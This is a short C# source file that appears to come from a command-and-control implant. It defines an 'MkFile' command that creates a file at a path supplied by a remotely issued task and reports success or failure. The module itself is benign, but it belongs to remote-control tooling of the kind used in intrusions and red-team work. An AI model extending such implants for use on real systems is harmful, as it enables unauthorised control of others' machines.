using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    internal class Mkfile : ImplantCommands
    {
        private string filePath { get; set; }
        public override string Name => "MkFile";

        public override string Execute(ImplantTask task)
        {
            filePath = task.Args;

            File.Create(filePath);

            if(File.Exists(filePath)) { return $"[*] {filePath} created\n"; }
            return $"[-] Failed to create {filePath}\n";
        }
    }
}
